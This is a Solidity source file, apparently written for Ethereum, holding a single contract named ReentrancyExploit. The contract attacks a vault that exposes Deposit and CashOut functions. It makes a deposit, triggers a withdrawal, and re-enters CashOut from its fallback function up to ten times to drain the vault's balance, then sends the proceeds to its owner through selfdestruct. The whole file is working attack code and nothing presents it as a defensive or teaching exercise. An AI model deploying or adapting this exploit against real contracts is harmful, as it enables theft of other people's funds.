pragma solidity ^0.4.19;

interface IETHVault {
    function Deposit() external payable;
    function CashOut(uint _am) external;
}

contract ReentrancyExploit {
    IETHVault public target;
    address public owner;
    uint public attackAmount = 1 ether;
    uint public drainCount;

    constructor(address _target) public {
        target = IETHVault(_target);
        owner = msg.sender;
    }

    // Receive ETH during reentrancy
    function () public payable {
        if (address(target).balance >= attackAmount && drainCount < 10) {
            drainCount++;
            target.CashOut(attackAmount);
        }
    }

    function attack() external payable {
        require(msg.value >= attackAmount);
        // Initial deposit
        target.Deposit.value(msg.value)();
        // Trigger reentrancy
        target.CashOut(attackAmount);
    }

    function collect() public {
        require(msg.sender == owner);
        selfdestruct(owner);
    }
}

